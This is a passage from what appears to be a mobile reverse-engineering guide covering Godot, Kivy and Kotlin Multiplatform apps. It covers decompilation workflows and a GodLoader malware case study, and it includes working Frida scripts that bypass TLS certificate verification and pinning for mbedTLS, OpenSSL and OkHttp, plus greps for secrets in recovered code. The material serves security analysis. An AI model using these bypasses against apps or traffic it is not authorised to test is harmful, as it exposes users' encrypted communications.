<code>lib/&lt;arch&gt;/</code> <code>org.godotengine.*</code> Package prefix in DEX and AndroidManifest.xml <code>org.godotengine.godot.Godot</code> Main activity class <code>project.binary</code> Compiled project settings inside <code>.pck</code> <code>.gdextension</code> / <code>.gdnlib</code> GDExtension/GDNative config files inside <code>.pck</code> <pre><code>unzip -l target.apk | grep -E \"(\\.pck|libgodot|godotengine)\"\n</code></pre>"},{"location":"reversing/frameworks/godot/#engine-version-detection","title":"Engine Version Detection","text":"<p>The Godot engine version is embedded in the PCK header and can also be extracted from <code>libgodot_android.so</code>:</p> <pre><code>strings lib/arm64-v8a/libgodot_android.so | grep -E \"^[0-9]+\\.[0-9]+\\.[0-9]+\"\n</code></pre> <p>The version determines which bytecode format is used and which decompilation tools are compatible.</p>"},{"location":"reversing/frameworks/godot/#analysis-workflow","title":"Analysis Workflow","text":""},{"location":"reversing/frameworks/godot/#step-1-extract-the-pck","title":"Step 1: Extract the PCK","text":"<p>Extract the <code>.pck</code> file from the APK:</p> <pre><code>unzip target.apk assets/*.pck -d extracted/\n</code></pre>"},{"location":"reversing/frameworks/godot/#step-2-decompile-with-gdsdecomp-gdre-tools","title":"Step 2: Decompile with gdsdecomp (GDRE Tools)","text":"<p>gdsdecomp (also called GDRE Tools) is the primary tool for Godot reverse engineering. It supports Godot 2.x, 3.x, and 4.x projects and can perform full project recovery from PCK, APK, or EXE files.</p> <pre><code>gdre_tools --headless --recover=\"extracted/assets/game.pck\" --output-dir=\"recovered_project/\"\n</code></pre> <p>Full project recovery extracts all resources and decompiles GDScript bytecode back to <code>.gd</code> source files. The recovered project can be opened directly in the Godot editor for analysis.</p> <p>For targeted decompilation of specific scripts:</p> <pre><code>gdre_tools --headless --decompile=\"res://scripts/main.gdc\" --bytecode=4.3.0\n</code></pre>"},{"location":"reversing/frameworks/godot/#step-3-analyze-recovered-gdscript","title":"Step 3: Analyze Recovered GDScript","text":"<p>The decompiled <code>.gd</code> files are near-source quality. GDScript decompilation preserves:</p> <ul> <li>Function names and signatures</li> <li>Variable names (not stripped in standard exports)</li> <li>String literals</li> <li>Class inheritance hierarchy</li> <li>Signal connections and node paths</li> <li>Export variables and their types</li> </ul> <p>Search for network endpoints, encryption keys, and authentication logic:</p> <pre><code>grep -rn \"http\\|https\\|api\\|key\\|secret\\|token\\|password\" recovered_project/\n</code></pre>"},{"location":"reversing/frameworks/godot/#step-4-c-variant-analysis","title":"Step 4: C# Variant Analysis","text":"<p>If the game uses C# instead of GDScript, the <code>.pck</code> or a separate <code>assemblies/</code> directory contains .NET DLLs. Extract and decompile with dnSpy or ILSpy:</p> <pre><code>gdre_tools --headless --extract=\"extracted/assets/game.pck\" --output-dir=\"pck_contents/\"\n</code></pre> <p>Look for <code>*.dll</code> files in the extracted output, particularly <code>Assembly-CSharp.dll</code> or project-named assemblies.</p>"},{"location":"reversing/frameworks/godot/#step-5-gdextension-gdnative-modules","title":"Step 5: GDExtension / GDNative Modules","text":"<p>GDExtension (Godot 4.x) and GDNative (Godot 3.x) modules are compiled shared libraries (<code>.so</code> on Android) that extend the engine with native code. These cannot be decompiled by gdsdecomp.</p> <p>Identify native modules by looking for <code>.gdextension</code> or <code>.gdnlib</code> configuration files in the extracted PCK:</p> <pre><code>grep -rn \"gdextension\\|gdnlib\" pck_contents/\n</code></pre> <p>The <code>.gdextension</code> file specifies library paths per platform. Extract the corresponding <code>.so</code> file and analyze with Ghidra or IDA.</p>"},{"location":"reversing/frameworks/godot/#analysis-tools-summary","title":"Analysis Tools Summary","text":"Tool Purpose URL gdsdecomp / GDRE Tools PCK extraction, GDScript decompilation, full project recovery Godot 2.x-4.x GdTool Lightweight GDScript compiler/decompiler (.NET-based) All GDScript versions Ghidra Native analysis of GDExtension/GDNative <code>.so</code> modules N/A dnSpy / ILSpy C# variant DLL decompilation .NET assemblies Frida Runtime hooking of engine and script functions All versions"},{"location":"reversing/frameworks/godot/#hooking","title":"Hooking","text":""},{"location":"reversing/frameworks/godot/#gdscript-vm-hooking","title":"GDScript VM Hooking","text":"<p>Frida hooks target <code>libgodot_android.so</code> to intercept GDScript VM execution. Key hook points include script function dispatch, signal emission, and resource loading:</p> <pre><code>var godot = Process.findModuleByName(\"libgodot_android.so\");\n\ngodot.enumerateExports().forEach(function(exp) {\n    if (exp.name.indexOf(\"GDScript\") !== -1 || exp.name.indexOf(\"gdscript\") !== -1) {\n        console.log(\"[Godot] \" + exp.name + \" @ \" + exp.address);\n    }\n});\n</code></pre>"},{"location":"reversing/frameworks/godot/#http-request-interception","title":"HTTP Request Interception","text":"<p>Godot's <code>HTTPRequest</code> and <code>HTTPClient</code> nodes use mbedTLS internally. Hook the HTTP layer to capture network traffic:</p> <pre><code>var godot = Process.findModuleByName(\"libgodot_android.so\");\n\ngodot.enumerateExports().forEach(function(exp) {\n    if (exp.name.indexOf(\"HTTPClient\") !== -1 &amp;&amp; exp.name.indexOf(\"request\") !== -1) {\n        Interceptor.attach(exp.address, {\n            onEnter: function(args) {\n                console.log(\"[Godot HTTP] request called\");\n            }\n        });\n    }\n});\n</code></pre>"},{"location":"reversing/frameworks/godot/#gdextension-function-hooking","title":"GDExtension Function Hooking","text":"<p>For games using GDExtension modules, hook the native library directly:</p> <pre><code>var extension = Process.findModuleByName(\"libcustom_extension.so\");\nif (extension) {\n    extension.enumerateExports().forEach(function(exp) {\n        console.log(\"[GDExt] \" + exp.name + \" @ \" + exp.address);\n    });\n}\n</code></pre>"},{"location":"reversing/frameworks/godot/#ssl-pinning","title":"SSL Pinning","text":"<p>Godot compiles mbedTLS directly into <code>libgodot_android.so</code> for all TLS operations. Standard Java-layer SSL bypass scripts (OkHttp, TrustManager) do not work because the engine never touches the Android Java TLS stack.</p>"},{"location":"reversing/frameworks/godot/#mbedtls-hook-bypass","title":"mbedTLS Hook Bypass","text":"<p>Hook <code>mbedtls_ssl_handshake</code> or the certificate verification callback in <code>libgodot_android.so</code>:</p> <pre><code>var godot = Process.findModuleByName(\"libgodot_android.so\");\n\nvar handshake = godot.enumerateExports().filter(function(e) {\n    return e.name.indexOf(\"mbedtls_ssl_handshake\") !== -1;\n});\n\nif (handshake.length &gt; 0) {\n    Interceptor.attach(handshake[0].address, {\n        onLeave: function(retval) {\n            retval.replace(0x0);\n            console.log(\"[mbedTLS] Handshake bypassed\");\n        }\n    });\n}\n</code></pre>"},{"location":"reversing/frameworks/godot/#certificate-verification-bypass","title":"Certificate Verification Bypass","text":"<p>Target the X.509 certificate verification function:</p> <pre><code>var godot = Process.findModuleByName(\"libgodot_android.so\");\n\nvar verify = godot.enumerateExports().filter(function(e) {\n    return e.name.indexOf(\"mbedtls_x509_crt_verify\") !== -1;\n});\n\nif (verify.length &gt; 0) {\n    Interceptor.attach(verify[0].address, {\n        onLeave: function(retval) {\n            retval.replace(0x0);\n            console.log(\"[mbedTLS] Certificate verification bypassed\");\n        }\n    });\n}\n</code></pre> <p>If mbedTLS symbols are not exported (stripped builds), use byte pattern scanning against known mbedTLS function prologues in <code>libgodot_android.so</code>.</p>"},{"location":"reversing/frameworks/godot/#malware-context","title":"Malware Context","text":""},{"location":"reversing/frameworks/godot/#godloader","title":"GodLoader","text":"<p>Godot has been directly exploited as a malware delivery mechanism. In November 2024, Check Point Research disclosed GodLoader, a campaign that abused the Godot engine to distribute cross-platform malware loaders.</p> Aspect Details Discovery November 2024, Check Point Research Infections 17,000+ systems since June 2024 Mechanism Malicious GDScript packed into <code>.pck</code> files, executed by legitimate Godot engine binaries Payloads RedLine Stealer, XMRig cryptocurrency miner Distribution Stargazer Goblin network -- 200+ fake GitHub repositories masquerading as game tools and cracked software Detection Near-zero VirusTotal detection at time of discovery Evasion Adds <code>C:\\</code> drive to Windows Defender exclusion list, sandbox/VM detection Platforms Windows, Linux, macOS (Android explored) <p>The attack works because the Godot engine binary itself is legitimate and signed. The malicious logic resides entirely in the <code>.pck</code> file as GDScript, which executes within the Godot VM. Antivirus engines do not parse <code>.pck</code> files or analyze GDScript bytecode, resulting in effectively zero detection.</p>"},{"location":"reversing/frameworks/godot/#why-godot-appeals-to-threat-actors","title":"Why Godot Appeals to Threat Actors","text":"<ul> <li>Signed engine binary -- the Godot executable is legitimate, trusted by AV heuristics</li> <li>GDScript execution -- Turing-complete scripting with filesystem access, process execution, and network capabilities</li> <li>Cross-platform -- single <code>.pck</code> payload works on Windows, Linux, macOS</li> <li>No compilation required -- GDScript runs interpreted or from bytecode, no native compilation step</li> <li>Open-source engine -- threat actors can study the engine source to optimize evasion</li> </ul>"},{"location":"reversing/frameworks/godot/#analysis-approach-for-godloader-samples","title":"Analysis Approach for GodLoader Samples","text":"<ol> <li>Extract the <code>.pck</code> from the distribution package</li> <li>Use gdsdecomp to recover the GDScript source</li> <li>Look for <code>OS.execute()</code>, <code>OS.shell_open()</code>, <code>HTTPRequest</code> nodes, and filesystem operations</li> <li>Trace C2 URLs in string literals and HTTP request targets</li> <li>Check for sandbox detection logic (VM detection, debugger checks)</li> </ol>"},{"location":"reversing/frameworks/godot/#re-difficulty-assessment","title":"RE Difficulty Assessment","text":"Aspect Rating Code format GDScript bytecode in <code>.pck</code> (fully decompilable) Tool maturity High -- gdsdecomp handles all Godot versions reliably Symbol recovery Excellent -- function names, variable names, class hierarchy preserved Control flow Full recovery -- decompiled GDScript is near-source quality String extraction Trivial -- strings preserved in bytecode and PCK resources SSL bypass Moderate -- requires mbedTLS native hooks (Java-layer useless) GDExtension/GDNative modules Hard -- compiled native code, Ghidra/IDA required Overall difficulty Moderate (rank 22/28) -- easy for pure GDScript, hard when native modules are involved <p>The primary bottleneck is GDExtension/GDNative modules. Pure GDScript games are straightforward -- gdsdecomp produces near-source quality output. When native modules are present, the analyst must combine GDScript decompilation (for high-level logic) with native RE (for the compiled extension code).</p>"},{"location":"reversing/frameworks/godot/#references","title":"References","text":"<ul> <li>gdsdecomp / GDRE Tools</li> <li>GdTool -- Lightweight GDScript Decompiler</li> <li>Godot Engine Source Code</li> <li>GDExtension Documentation</li> <li>Check Point Research: GodLoader -- Gaming Engines as Malware Loaders</li> <li>Godot Engine Statement on GodLoader</li> <li>BleepingComputer: GodLoader Infects Thousands</li> <li>Godot Mod Loader Wiki: Decompiling with GDRE Tools</li> </ul>"},{"location":"reversing/frameworks/kivy/","title":"Kivy (Python for Android)","text":"<p>Kivy apps embed a full CPython (or occasionally PyPy) runtime inside the APK, bundled via python-for-android (p4a). The UI is rendered through SDL2 onto a <code>SurfaceView</code>, bypassing Android's native widget system entirely. Application logic is written in Python, compiled to <code>.pyc</code> bytecode, and packed into an archive (typically <code>assets/private.tar</code> or <code>assets/private.mp3</code>) that gets extracted at first launch. Kivy is an open-source framework primarily used for prototyping, educational apps, and niche tools -- but its Python foundation makes it trivial to recover source code from production builds.</p>"},{"location":"reversing/frameworks/kivy/#architecture","title":"Architecture","text":""},{"location":"reversing/frameworks/kivy/#runtime-model","title":"Runtime Model","text":"Layer Components Java shell <code>PythonActivity</code> or <code>PythonService</code> (extends <code>Activity</code>/<code>Service</code>), <code>org.kivy.android.*</code> classes Native runtime <code>libpython3.x.so</code> -- embedded CPython interpreter SDL2 layer <code>libSDL2.so</code>, <code>libSDL2_image.so</code>, <code>libSDL2_mixer.so</code>, <code>libSDL2_ttf.so</code> -- rendering and input Python modules <code>.pyc</code> files (compiled bytecode) packed in <code>assets/private.tar</code> or <code>assets/private.mp3</code> Kivy framework Pure Python Kivy modules alongside application code in the same archive"},{"location":"reversing/frameworks/kivy/#bootstrap-flow","title":"Bootstrap Flow","text":"<ol> <li><code>PythonActivity</code> starts and calls native initialization via JNI</li> <li><code>libSDL2.so</code> initializes the rendering surface</li> <li><code>libpython3.x.so</code> starts the CPython interpreter</li> <li>Python bootstrap extracts <code>private.tar</code> to the app's internal storage (first run)</li> <li>The interpreter executes <code>main.py</code> (or <code>main.pyc</code>) as the entry point</li> <li>Kivy initializes its event loop, window, and widget tree on the SDL2 surface</li> </ol>"},{"location":"reversing/frameworks/kivy/#rendering","title":"Rendering","text":"<p>Kivy renders through SDL2 and OpenGL ES, drawing its own widget system. Android UI tools (Layout Inspector, <code>uiautomator</code>) see a single opaque <code>SurfaceView</code>. Kivy widgets (<code>Button</code>, <code>Label</code>, <code>TextInput</code>) are Python objects with no Android <code>View</code> counterpart.</p>"},{"location":"reversing/frameworks/kivy/#identification","title":"Identification","text":"Indicator Location <code>libpython3.x.so</code> <code>lib/&lt;arch&gt;/</code> -- embedded CPython runtime <code>libSDL2.so</code> <code>lib/&lt;arch&gt;/</code> -- SDL2 rendering library <code>libSDL2_image.so</code>, <code>libSDL2_mixer.so</code> <code>lib/&lt;arch&gt;/</code> -- SDL2 companion libraries <code>assets/private.tar</code> or <code>assets/private.mp3</code> Packed Python bytecode archive <code>org.kivy.android.*</code> DEX classes <code>org.kivy.android.PythonActivity</code> Main activity in manifest <code>libmain.so</code> p4a bootstrap native entry point <code>_python_bundle</code> Directory name inside the extracted archive <p>Quick check:</p> <pre><code>unzip -l target.apk | grep -iE \"(libpython|libSDL2|private\\.(tar|mp3)|org\\.kivy)\"\n</code></pre> <p>private.mp3 Disguise</p> <p>Some p4a builds rename <code>private.tar</code> to <code>private.mp3</code> to bypass asset compression in older Android build tools. The file is still a tar archive regardless of extension.</p>"},{"location":"reversing/frameworks/kivy/#code-extraction","title":"Code Extraction","text":""},{"location":"reversing/frameworks/kivy/#extracting-the-python-archive","title":"Extracting the Python Archive","text":"<p>The primary target is the <code>private.tar</code> (or <code>private.mp3</code>) archive containing all Python bytecode:</p> <pre><code>unzip target.apk assets/private.tar -d extracted/\ncd extracted/assets/\ntar xf private.tar\n</code></pre> <p>If the archive is named <code>private.mp3</code>:</p> <pre><code>unzip target.apk assets/private.mp3 -d extracted/\ncd extracted/assets/\ntar xf private.mp3\n</code></pre>"},{"location":"reversing/frameworks/kivy/#archive-contents","title":"Archive Contents","text":"<p>The extracted archive typically contains:</p> Path Contents <code>main.pyc</code> Application entry point <code>*.pyc</code> Application Python modules (compiled bytecode) <code>kivy/</code> Kivy framework modules (<code>.pyc</code>) <code>*.kv</code> Kivy language files (declarative UI definitions, plaintext) <code>certifi/</code> CA certificate bundle (if requests library is included) <code>*.so</code> Native extension modules (e.g., compiled Cython modules)"},{"location":"reversing/frameworks/kivy/#kivy-language-files-kv","title":"Kivy Language Files (.kv)","text":"<p>Kivy uses a declarative UI language stored in <code>.kv</code> files. These are plaintext and directly readable:</p> <pre><code>find extracted/ -name \"*.kv\" -exec ls -la {} \\;\n</code></pre> <p><code>.kv</code> files define the widget tree, property bindings, and event handlers. They are analogous to QML in Qt or XAML in .NET -- reading them reveals the app's UI structure and data flow without any decompilation.</p>"},{"location":"reversing/frameworks/kivy/#on-device-extraction","title":"On-Device Extraction","text":"<p>If the archive is difficult to extract statically, pull the unpacked Python files from the app's internal storage after first launch:</p> <pre><code>adb shell run-as com.target.package tar cf /data/local/tmp/pyfiles.tar /data/data/com.target.package/files/app/\nadb pull /data/local/tmp/pyfiles.tar\n</code></pre>"},{"location":"reversing/frameworks/kivy/#python-bytecode-decompilation","title":"Python Bytecode Decompilation","text":""},{"location":"reversing/frameworks/kivy/#pyc-file-format","title":".pyc File Format","text":"<p>Python <code>.pyc</code> files start with a 4-byte magic number identifying the Python version, followed by 4 bytes of flags, 8 bytes of timestamp/hash, and the marshalled code object. The magic number is critical -- it determines which Python version the bytecode targets, and decompilers must match this version.</p>"},{"location":"reversing/frameworks/kivy/#decompilation-tools","title":"Decompilation Tools","text":"Tool Python Versions Notes uncompyle6 2.x -- 3.8 Most mature decompiler, excellent output quality for supported versions decompyle3 3.7 -- 3.8 Fork of uncompyle6 focused on Python 3 pycdc 1.0 -- 3.12+ C++ decompiler, broadest version support, less polished output pylingual 3.x (wide range) Web-based and CLI decompiler using neural network-assisted reconstruction dis All Built-in Python disassembler -- outputs raw bytecode, not source uncompyle6pycdcpylingual <pre><code>pip install uncompyle6\nuncompyle6 -o decompiled/ extracted/main.pyc\nuncompyle6 -o decompiled/ extracted/*.pyc\n</code></pre> <pre><code>git clone https://github.com/zrax/pycdc.git\ncd pycdc &amp;&amp; cmake . &amp;&amp; make\n./pycdc extracted/main.pyc &gt; decompiled/main.py\n</code></pre> <pre><code>pip install pylingual\npylingual extracted/main.pyc -o decompiled/main.py\n</code></pre> <p>Version Mismatch</p> <p>p4a bundles a specific CPython version (commonly 3.8--3.11). Check the <code>.pyc</code> magic number to determine the exact version before choosing a decompiler. Using the wrong decompiler version produces garbage output or fails entirely.</p>"},{"location":"reversing/frameworks/kivy/#identifying-python-version-from-pyc","title":"Identifying Python Version from .pyc","text":"<pre><code>xxd -l 4 extracted/main.pyc\n</code></pre> <p>Common magic numbers:</p> Magic (hex) Python Version <code>420D0D0A</code> 3.7 <code>550D0D0A</code> 3.8 <code>610D0D0A</code> 3.9 <code>6F0D0D0A</code> 3.10 <code>A70D0D0A</code> 3.11 <code>CB0D0D0A</code> 3.12"},{"location":"reversing/frameworks/kivy/#batch-decompilation","title":"Batch Decompilation","text":"<pre><code>find extracted/ -name \"*.pyc\" -exec uncompyle6 -o decompiled/ {} +\n</code></pre> <p>For Python versions beyond 3.8, use pycdc instead:</p> <pre><code>find extracted/ -name \"*.pyc\" -exec sh -c './pycdc \"$1\" &gt; \"decompiled/$(basename \"$1\" .pyc).py\"' _ {} \\;\n</code></pre>"},{"location":"reversing/frameworks/kivy/#analysis-workflow","title":"Analysis Workflow","text":"<ol> <li>Unzip APK and confirm Kivy via <code>libpython*.so</code>, <code>libSDL2.so</code>, and <code>private.tar</code></li> <li>Extract <code>private.tar</code> to obtain <code>.pyc</code> and <code>.kv</code> files</li> <li>Read <code>.kv</code> files for UI structure and event handler names</li> <li>Check Python version from <code>.pyc</code> magic bytes</li> <li>Decompile <code>.pyc</code> files with the appropriate tool (uncompyle6 for 3.7-3.8, pycdc for broader support)</li> <li>Review <code>main.py</code> as the entry point -- trace imports and function calls</li> <li>Search decompiled source for API endpoints, credentials, crypto keys, C2 URLs</li> <li>Hook at runtime with Frida for dynamic analysis of encrypted/obfuscated values</li> </ol>"},{"location":"reversing/frameworks/kivy/#hooking-strategy","title":"Hooking Strategy","text":""},{"location":"reversing/frameworks/kivy/#python-object-hooks-via-libpython","title":"Python Object Hooks via libpython","text":"<p>Hook CPython internal functions to intercept Python-level operations:</p> <pre><code>var libpython = Process.findModuleByName(\"libpython3.8.so\") || Process.findModuleByName(\"libpython3.9.so\") || Process.findModuleByName(\"libpython3.10.so\") || Process.findModuleByName(\"libpython3.11.so\");\nif (libpython) {\n    var pyEval = libpython.findExportByName(\"PyEval_EvalFrameDefault\");\n    if (pyEval) {\n        console.log(\"[Python] PyEval_EvalFrameDefault @ \" + pyEval);\n    }\n\n    var pyImport = libpython.findExportByName(\"PyImport_ImportModule\");\n    if (pyImport) {\n        Interceptor.attach(pyImport, {\n            onEnter: function(args) {\n                console.log(\"[Python] import: \" + Memory.readUtf8String(args[0]));\n            },\n            onLeave: function(retval) {}\n        });\n    }\n}\n</code></pre>"},{"location":"reversing/frameworks/kivy/#network-and-function-call-interception","title":"Network and Function Call Interception","text":"<p>Python networking (<code>urllib3</code>, <code>requests</code>, <code>http.client</code>) flows through <code>libpython</code>'s socket layer and ultimately <code>libssl</code>. Hook <code>SSL_write</code> and <code>SSL_read</code> in <code>libssl.so</code> to capture all encrypted traffic (see SSL Pinning Bypass section for <code>libssl</code> hook patterns).</p> <p>For intercepting specific Python function calls, hook <code>PyObject_Call</code> and use <code>PyObject_Repr</code> to resolve the callable's name at runtime. Filter for targets like <code>request</code>, <code>encrypt</code>, or <code>send</code> to reduce noise.</p>"},{"location":"reversing/frameworks/kivy/#ssl-pinning-bypass","title":"SSL Pinning Bypass","text":"<p>Kivy/Python apps handle SSL through Python's <code>ssl</code> module or the <code>certifi</code> CA bundle. Bypass approaches:</p>"},{"location":"reversing/frameworks/kivy/#openssl-verification-bypass","title":"OpenSSL Verification Bypass","text":"<pre><code>var libssl = Process.findModuleByName(\"libssl.so\") || Process.findModuleByName(\"libssl1.1.so\") || Process.findModuleByName(\"libssl3.so\");\nif (libssl) {\n    var setVerify = libssl.findExportByName(\"SSL_CTX_set_verify\");\n    if (setVerify) {\n        Interceptor.attach(setVerify, {\n            onEnter: function(args) {\n                args[1] = ptr(0);\n                args[2] = ptr(0);\n                console.log(\"[SSL] SSL_CTX_set_verify forced to SSL_VERIFY_NONE\");\n            }\n        });\n    }\n\n    var verifyResult = libssl.findExportByName(\"SSL_get_verify_result\");\n    if (verifyResult) {\n        Interceptor.attach(verifyResult, {\n            onLeave: function(retval) {\n                retval.replace(ptr(0));\n                console.log(\"[SSL] SSL_get_verify_result forced to X509_V_OK\");\n            }\n        });\n    }\n}\n</code></pre>"},{"location":"reversing/frameworks/kivy/#patching-the-certifi-bundle","title":"Patching the certifi Bundle","text":"<p>Python's <code>requests</code> library validates certificates against the <code>certifi</code> CA bundle. Append a custom CA certificate to the extracted <code>certifi/cacert.pem</code>, repackage <code>private.tar</code>, and rebuild the APK.</p>"},{"location":"reversing/frameworks/kivy/#re-difficulty-assessment","title":"RE Difficulty Assessment","text":"Aspect Rating Code format Python bytecode (<code>.pyc</code>) + plaintext <code>.kv</code> UI files Readability High -- decompiled Python is near-original source quality String extraction Trivial -- strings preserved in bytecode constant pools Control flow recovery Full -- Python decompilers recover structured code Patching Edit decompiled <code>.py</code>, recompile to <code>.pyc</code>, repackage Obfuscation ceiling Low -- Python bytecode is fundamentally transparent Overall difficulty Easy (rank 14/28) <p>Kivy apps are among the easiest Android targets to reverse engineer. The Python bytecode decompiles to near-original source code, <code>.kv</code> files provide the UI structure in plaintext, and the framework offers no meaningful obfuscation layer. The only complications are Python version mismatches with decompiler tools and the occasional use of Cython-compiled extension modules (<code>.so</code> files within the bundle), which require native analysis.</p>"},{"location":"reversing/frameworks/kivy/#references","title":"References","text":"<ul> <li>Kivy Framework</li> <li>python-for-android (p4a)</li> <li>uncompyle6</li> <li>decompyle3</li> <li>pycdc -- C++ Python Decompiler</li> <li>pylingual</li> <li>Frida -- Dynamic Instrumentation</li> <li>Kivy Language (.kv) Documentation</li> <li>CPython .pyc Format</li> </ul>"},{"location":"reversing/frameworks/kotlin-multiplatform/","title":"Kotlin Multiplatform","text":"<p>Kotlin Multiplatform (KMP) allows developers to write shared business logic in Kotlin that compiles to platform-native output -- standard JVM/DEX bytecode on Android, native binaries on iOS, and JavaScript for web. On Android, KMP code compiles to the same DEX bytecode as any regular Kotlin Android app, making it indistinguishable at the binary level from a standard native app. This is the core reverse engineering challenge: there are no unique runtime markers, custom VMs, or bundled interpreters to identify. The framework is developed by JetBrains and reached stable status in November 2023.</p>"},{"location":"reversing/frameworks/kotlin-multiplatform/#architecture","title":"Architecture","text":""},{"location":"reversing/frameworks/kotlin-multiplatform/#shared-code-model","title":"Shared Code Model","text":"<p>KMP projects use a hierarchical source set structure where common business logic lives in <code>commonMain</code> and platform-specific implementations live in platform source sets:</p> Source Set Purpose commonMain Shared business logic, data models, networking, serialization androidMain Android-specific implementations (platform APIs, UI bindings) iosMain iOS-specific implementations (not relevant to Android RE) commonTest Shared test code <p>At compile time, the Kotlin compiler merges <code>commonMain</code> and <code>androidMain</code> into standard Kotlin/JVM bytecode, which then goes through D8/R8 to produce DEX. The resulting APK contains no trace of the multiplatform source structure.</p>"},{"location":"reversing/frameworks/kotlin-multiplatform/#expectactual-pattern","title":"Expect/Actual Pattern","text":"<p>KMP's primary mechanism for platform abstraction is the <code>expect</code>/<code>actual</code> pattern. Common code declares an <code>expect</code> function or class, and each platform provides an <code>actual</code> implementation:</p> <p>In source, this looks like a common interface with platform-specific backends. After compilation to DEX, the <code>expect</code> declarations disappear entirely -- they exist only at compile time. The decompiled output shows only the concrete <code>actual</code> implementations as regular Kotlin classes and functions.</p>"},{"location":"reversing/frameworks/kotlin-multiplatform/#compilation-pipeline","title":"Compilation Pipeline","text":"<pre><code>commonMain (Kotlin) \u2500\u2500\u2510\n                      \u251c\u2500\u2500&gt; Kotlin/JVM Compiler \u2500\u2500&gt; .class files \u2500\u2500&gt; D8/R8 \u2500\u2500&gt; DEX\nandroidMain (Kotlin) \u2500\u2518\n</code></pre> <p>The output is identical to a standard Kotlin Android project. No intermediate bytecode formats, no embedded interpreters, no bundled scripts.</p>"},{"location":"reversing/frameworks/kotlin-multiplatform/#identification","title":"Identification","text":"<p>KMP apps produce standard DEX bytecode with no definitive fingerprint. Identification relies on indirect signals rather than definitive markers.</p> Indicator Confidence Details Ktor classes in DEX High <code>io.ktor.client.*</code> is the standard KMP HTTP client kotlinx.serialization Medium <code>kotlinx.serialization.*</code> classes are common in KMP projects kotlinx.coroutines Low Used widely in all Kotlin projects, not KMP-specific Multi-target library packages Medium Presence of <code>org.jetbrains.kotlinx.*</code> utility libraries Lack of framework markers N/A No React Native, Flutter, or Xamarin markers in an app that has iOS counterpart <p>Quick check for Ktor (strongest KMP signal):</p> <pre><code>jadx -d output/ target.apk\ngrep -r \"io.ktor\" output/ --include=\"*.java\" -l\n</code></pre>"},{"location":"reversing/frameworks/kotlin-multiplatform/#what-you-will-not-find","title":"What You Will NOT Find","text":"<p>Unlike Flutter (<code>libflutter.so</code>), React Native (<code>libhermes.so</code>), or Xamarin (<code>libmonosgen.so</code>), KMP leaves no native libraries, bundled runtimes, or asset files that betray its origin. The DEX bytecode is structurally identical to a hand-written Kotlin Android app.</p> <p>Identification is Probabilistic</p> <p>There is no single artifact that definitively identifies a KMP app. The best approach is to look for a combination of common KMP libraries (Ktor, kotlinx.serialization, kotlinx.datetime) alongside the absence of other cross-platform framework markers.</p>"},{"location":"reversing/frameworks/kotlin-multiplatform/#analysis","title":"Analysis","text":""},{"location":"reversing/frameworks/kotlin-multiplatform/#standard-jadx-workflow","title":"Standard Jadx Workflow","text":"<p>Since KMP compiles to normal DEX bytecode, the standard Android reverse engineering workflow applies without modification:</p> <pre><code>jadx -d output/ target.apk\n</code></pre> <p>The decompiled output is standard Kotlin (displayed as Java by jadx, or as Kotlin with <code>--decompile-kotlin</code> flag). All KMP shared code appears as regular classes and functions.</p>"},{"location":"reversing/frameworks/kotlin-multiplatform/#identifying-former-commonmain-code","title":"Identifying Former commonMain Code","text":"<p>Code that originated in <code>commonMain</code> often exhibits these patterns in decompiled output:</p> Pattern Indicator Platform abstraction wrappers Classes that wrap simple platform calls (e.g., <code>PlatformProvider.getDeviceId()</code>) Interface + single implementation An interface with exactly one Android implementation, suggesting expect/actual origin Ktor networking throughout All HTTP calls using Ktor rather than OkHttp/Retrofit directly kotlinx.serialization annotations <code>@Serializable</code> data classes with generated <code>Companion</code> serializers kotlinx.datetime usage <code>kotlinx.datetime.Instant</code> instead of <code>java.time.*</code>"},{"location":"reversing/frameworks/kotlin-multiplatform/#data-class-serialization","title":"Data Class Serialization","text":"<p>KMP apps heavily use <code>kotlinx.serialization</code> for JSON handling. The compiler plugin generates serializer companion objects for each <code>@Serializable</code> data class:</p> <pre><code>grep -r \"serializer\" output/ --include=\"*.java\" | grep \"Companion\"\n</code></pre> <p>These generated serializers contain the complete field mapping, making it straightforward to reconstruct API request/response models even in R8-obfuscated builds.</p>"},{"location":"reversing/frameworks/kotlin-multiplatform/#ktor-client-networking","title":"Ktor Client Networking","text":"<p>Ktor is the standard HTTP client in KMP projects because it supports all KMP targets. On Android, Ktor uses OkHttp as its underlying engine by default.</p>"},{"location":"reversing/frameworks/kotlin-multiplatform/#ktor-architecture-on-android","title":"Ktor Architecture on Android","text":"<pre><code>Application Code \u2500\u2500&gt; Ktor Client API \u2500\u2500&gt; CIO / OkHttp Engine \u2500\u2500&gt; Network\n</code></pre> <p>The key classes in decompiled output:</p> Class Purpose <code>io.ktor.client.HttpClient</code> Main client entry point <code>io.ktor.client.engine.okhttp.OkHttpEngine</code> Android HTTP engine (wraps OkHttp) <code>io.ktor.client.request.HttpRequestBuilder</code> Request construction <code>io.ktor.client.plugins.contentnegotiation.*</code> JSON serialization plugin <code>io.ktor.client.plugins.auth.*</code> Authentication plugin (Bearer, Basic)"},{"location":"reversing/frameworks/kotlin-multiplatform/#intercepting-ktor-traffic","title":"Intercepting Ktor Traffic","text":"<p>Since Ktor uses OkHttp on Android, standard OkHttp interceptor hooks work:</p> <pre><code>Java.perform(function() {\n    var OkHttpClient = Java.use(\"okhttp3.OkHttpClient\");\n    var Builder = Java.use(\"okhttp3.OkHttpClient$Builder\");\n\n    Builder.build.implementation = function() {\n        var client = this.build();\n        console.log(\"[Ktor/OkHttp] Client built with interceptors: \" + client.interceptors());\n        return client;\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/kotlin-multiplatform/#ktor-ssl-pinning","title":"Ktor SSL Pinning","text":"<p>Ktor on Android delegates TLS to OkHttp, so standard OkHttp certificate pinner bypasses apply:</p> <pre><code>Java.perform(function() {\n    var CertPinner = Java.use(\"okhttp3.CertificatePinner\");\n    CertPinner.check.overload(\"java.lang.String\", \"java.util.List\").implementation = function(hostname, peerCertificates) {\n        console.log(\"[Ktor] Bypassed certificate pin for: \" + hostname);\n    };\n});\n</code></pre> <p>Some KMP apps configure Ktor-level pinning through <code>io.ktor.client.engine.okhttp.OkHttpConfig</code>. This still resolves to OkHttp's <code>CertificatePinner</code> at runtime.</p>"},{"location":"reversing/frameworks/kotlin-multiplatform/#hooking-strategy","title":"Hooking Strategy","text":""},{"location":"reversing/frameworks/kotlin-multiplatform/#standard-kotlinjava-hooks","title":"Standard Kotlin/Java Hooks","text":"<p>KMP compiles to standard DEX, so all Frida Java hooks work without special handling:</p> <pre><code>Java.perform(function() {\n    var TargetClass = Java.use(\"com.example.shared.NetworkRepository\");\n    TargetClass.fetchUserData.implementation = function(userId) {\n        